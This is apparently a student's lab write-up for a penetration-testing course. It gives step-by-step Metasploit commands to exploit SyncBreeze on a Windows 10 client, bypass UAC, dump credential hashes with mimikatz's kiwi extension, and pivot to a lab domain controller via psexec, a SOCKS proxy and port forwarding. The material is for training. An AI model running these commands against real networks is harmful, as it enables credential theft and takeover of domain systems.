22.5.4.1

# 22.5.4.1.1. Use post-exploitation modules and extensions along with pivoting techniques to enumerate and compromise the domain controller from a meterpreter shell obtained from your Windows 10 client.

### Post-Exploitation Modules
#### module: bypassuac_injection_winsxs
Logon to Windows 10 client as user corp\offsec
![706c3c161159e2b083c57e7a80224565.png](7af7221a969644e19f42883e9c84badc.png)

Start syncbreeze
![393ffb6b53beb233d2ad329a7e81177e.png](1640f3a2bb6b47d0a47e5bc02974a1bf.png)

Start file explorer
![f31e7893fb127b195538231e23e2b0e3.png](36b50d0b495b41ce9a25db8b7eb215fd.png)

Run the syncbreeze exploit on Metasploit and send it to background
`sudo msfconsole -q`
`search syncbreeze`
`use 1`
`show options`
`set rhosts 192.168.214.10`
`check`
`exploit`
`background`
![88e1e0019aa98835a02f1402b1744911.png](2bf0013a105649418cb06ccca0031a9b.png)

Migrate to the explorer process which runs as user corp\offsec
`ps`
`migrate 4364
![dceefce5328b55f415f0c39af5361c72.png](1f71accbfccf48178847f94ab2816be7.png)

Run the bypassuac_injection_winsxs exploit. Remember to check the lhost option is correct (should be your Kali machine)
`use exploit/windows/local/bypassuac_injection_winsxs`
`set session 1`
`set lhost 192.168.119.214`
![2ce9d73067dc03bdac5112c0fb1aca93.png](0c84f41ad7aa4cf69fafcf91c747f866.png)

Load powershell
`load powershell`
`help powershell`
`powershell_execute "$PSVersionTable.PSVersion"`
![e9573853e3d5eda6aa40a2ae009c25b1.png](eac0d041191a41fbb20b61b30c0e9539.png)

Run the mimikatz extension, elevate to SYSTEM, and get creds
`load kiwi`
`getsystem`
`creds_msv`

Here are the credentials we found
```plaintext
Username    Domain  NTLM                              SHA1                                      DPAPI
--------    ------  ----                              ----                                      -----
CLIENT251$  corp    6fe9c9b48cc523c9686acd48f2328f1b  095e7ac33645d523d11d12443ce98db8ed801ece  
offsec      corp    2892d26cdf84d7a70e2eb3b9f05c425e  a188967ac5edb88eca3301f93f756ca8e94013a3  c9908721e77bed34ce549998baa6cebb

```
![922aad356180ad7954f11666380049d0.png](bfb6d3c30d494667866783f8888bfc4e.png)



### Pivoting with MSF
View the network interfaces for Windows 10 client
![22fbc8b2d3f1751f314da86d90208f99.png](28c8de14893e4ee2a19480b52fa75bb6.png)

#### Pivoting with smb/psexec
Use the custom SyncBreeze exploit we created in the previous question to compromise the Windows 10 client
`sudo msfconsole -q`
`search syncbreeze`
`use 1`
`show options`
`set rhosts 192.168.214.10`
`check`
`exploit`
![1795ce7d2bf8842cc426c8632a88fac3.png](740e4633edb8446ab2e527e0c7f0e110.png)

Send the meterpreter session to background, then manually add a route for the domain controller
`background`
`sessions -l`
`route add 172.16.214.0/24 1`
`route print`
![657b42b2326ffe90e466b6c850eee280.png](5a540c499d684828a299c76cab892b3d.png)

Use the portscanner to enumerate the 172.16.214.0/24 subnet. We already know that the address of the domain controller is 172.16.214.5
`use auxiliary/scanner/portscan/tcp`
`set rhosts 172.16.214.5`
`set ports 445,3389`
`run`
![5237b40def67ee9b22e1f39fcf82d33b.png](0510a52309c5432c9bb606190e7e6a33.png)

Attempt to pivot to a domain controller using smb/psexec module
`use exploit/windows/smb/psexec`
`set smbdomain corp`
`set smbuser jeff_admin`
`set smbpass lab`
`set rhosts 172.16.214.5`
`set payload windows/meterpreter/bind_tcp`
`set rhost 172.16.214.5`
`set lport 444`
`exploit`
![4327eab7aefd434706e775ab54ab8df4.png](657f75bad7bb404db3a5a21d8af27fe4.png)





#### Pivoting using proxychains
Start MSF and get a meterpreter shell using our custom syncbreeze exploit
`search msfconsole -q`
`search syncbreeze`
`use 1`
`set rhosts 192.168.214.10`
`check`
`exploit`
![7fe15a12161ac5795dc7772e5a9b2ad7.png](64491b018e1a405abfca2fc7cb8c05c8.png)

Add the route
`use multi/manage/autoroute`
`show options`
`sessions -l`
`set session 1`
`exploit`
![19dd883541ed57c55853d9a0d80f82bd.png](8496c50b0ecd4681bf6ea8f067b41d15.png)

Configure a SOCKS proxy
`use auxiliary/server/socks4a`
`show options`
`set srvhost 127.0.0.1`
`exploit -j`
![7e2f7009b05b53adf2a882c47afa5f04.png](a08cfefaeef04a43a70ac30f6789b167.png)

Open a new terminal on Kali and append `socks4  127.0.0.1 1080` to /etc/proxychains.conf
![330b92da891dd33417195e553ca98a68.png](5c01704853a44487a34422d28734ec06.png)

Run proxychains to run an application like rdesktop to obain GUI access from our KAli system to the domain controller on the internal network
`sudo proxychains rdesktop 172.16.214.5`
![c04f9a37d0327bcb282861bf6c4b2ea0.png](2404159d9e9a4dc2bca43a51376c7ec4.png)

We are presented with a login window. Log on as user corp\jeff_admin
![f0af77d8f6144e0eeb38a2a2a9cce1ce.png](f0d3bca4e88e485c86e048ff37d03844.png)
![0cff0a30bef45e3f5374c73064fbd53e.png](dfafd11ed0b84c0d830acd5fc964e4e7.png)


#### Pivot using portfwd
Ensure Syncbreeze is running on Windows 10, then compromise the Windows 10 client using our custom syncbreeze exploit.

![4da78d026f7be674f936f5f805e1301e.png](0d4e801e4ada462f8ce2e2cd0b432a4b.png)

User portfwd within meterpreter to cfeate a local port forward on the domain controller 172.16.214.5
`portfwd add -l 3389 -p 3389 -r 172.16.214.5`
![9693038da607e307c53414f6032d42f4.png](07889cee94d442e1ae23133263ca8c97.png)

Open a new terminal on Kali and run the rdesktop command
`rdesktop 127.0.0.1`
![9afde24af7a156a95d07034289421639.png](e3d0dc7dd8894ae1a21f819b1d1d44ab.png)

We are presented with a login window for the domain controller. Log in as jeff_admin
![27df20a54c517e72bee617561faeb4e1.png](b18c2f3f3f6b4d83ac67dd73d9a3c598.png)
![8a5087fdb946188d09cd8ca7979849b6.png](fe575c9dd56141b3a1b97a101e184a10.png)
